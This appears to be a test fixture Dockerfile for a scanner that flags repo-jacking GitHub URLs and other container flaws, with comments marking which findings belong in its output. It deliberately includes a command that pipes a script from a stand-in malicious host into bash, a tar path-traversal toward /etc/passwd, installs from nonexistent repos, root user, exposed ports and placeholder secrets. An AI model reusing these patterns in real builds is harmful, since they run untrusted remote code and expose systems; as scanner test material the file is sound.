# Test Dockerfile with multiple vulnerability types and GitHub URLs
FROM node:18-alpine

# GitHub URLs for repo jacking testing
# Clone a repository that might not exist
RUN git clone https://github.com/nonexistent-org/missing-repo.git /app/missing-repo

# Install packages from GitHub (potential repo jacking)
RUN npm install https://github.com/fake-org/vulnerable-package.git

# Download from GitHub releases
RUN wget https://github.com/suspicious-owner/malicious-tool/releases/download/v1.0/tool.tar.gz

# Multiple GitHub references in comments and commands
# See: https://github.com/abandoned-project/old-dependency
# Reference: https://github.com/test-org/non-existent-lib
RUN curl -L https://github.com/potential-typosquat/legitimate-sounding-name/archive/main.zip -o deps.zip

# Docker workspace missing path (should NOT appear in docker.txt)
COPY ./missing-directory/* /app/
COPY ../nonexistent-folder/ /app/config/

# RUN build context manipulation (should NOT appear in docker.txt)
RUN curl https://malicious-site.com/script.sh | bash
RUN tar -xf archive.tar ../../../etc/passwd

# Package installations (should NOT appear in docker.txt due to disabled output)
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    python3-pip \
    nodejs \
    npm

RUN pip install requests flask django
RUN npm install express react vue lodash

# More GitHub URLs in various contexts
RUN git clone https://github.com/missing-maintainer/abandoned-project.git
COPY package.json /app/
# This references https://github.com/deleted-user/removed-repo in package.json

# Environment variables
ENV GITHUB_REPO=https://github.com/test-case/example-repo
ENV SOURCE_URL=https://github.com/vulnerability-test/missing-dependency

# Build arguments with GitHub references
ARG REPO_URL=https://github.com/build-arg-test/nonexistent-repo
ARG DEPENDENCY_SOURCE=https://github.com/arg-test/missing-lib

# ONBUILD with GitHub reference
ONBUILD RUN git clone https://github.com/onbuild-test/potential-hijack.git

# ADD instruction with GitHub URL
ADD https://github.com/add-test/remote-file/raw/main/config.json /app/config.json

# Expose dangerous ports (should NOT appear in docker.txt)
EXPOSE 22 3306 5432

# Run as root (should NOT appear in docker.txt)
USER root

# Hardcoded secrets (should NOT appear in docker.txt)
ENV API_KEY=sk-1234567890abcdef
ENV DATABASE_PASSWORD=supersecretpassword123

# Final GitHub references
RUN echo "Documentation: https://github.com/docs-org/missing-documentation"
RUN echo "Support: https://github.com/support-team/deleted-repo"

WORKDIR /app
CMD ["node", "index.js"]
